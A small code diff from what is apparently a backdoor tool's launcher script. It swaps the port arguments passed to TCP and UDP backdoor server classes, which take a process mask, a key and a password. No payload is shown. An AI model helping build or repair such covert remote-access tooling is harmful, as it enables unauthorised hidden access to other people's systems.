@@ -45,9 +45,9 @@ def main():
     if args.mode == "server":
         mask = args.mask if args.mask else DEFAULT_MASK
         if args.protocol == "tcp":
-            server = backdoor.TcpBackdoorServer(mask, key, pw, args.lport, args.dport)
+            server = backdoor.TcpBackdoorServer(mask, key, pw, args.dport, args.lport)
         elif args.protocol == "udp":
-            server = backdoor.UdpBackdoorServer(mask, key, pw, args.lport, args.dport)
+            server = backdoor.UdpBackdoorServer(mask, key, pw, args.dport, args.lport)
         
         server.run()
     
